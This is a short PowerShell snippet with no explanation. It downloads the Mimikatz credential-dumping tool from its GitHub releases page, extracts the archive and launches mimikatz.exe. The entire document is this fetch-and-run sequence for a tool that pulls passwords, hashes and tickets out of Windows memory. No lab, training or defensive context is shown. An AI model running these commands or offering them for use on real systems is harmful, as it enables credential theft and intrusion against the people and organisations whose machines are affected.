Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip" -OutFile "mimikatz.zip" Expand-Archive -Path "mimikatz.zip" -DestinationPath "mimikatz" cd "mimikatz" .\mimikatz.exe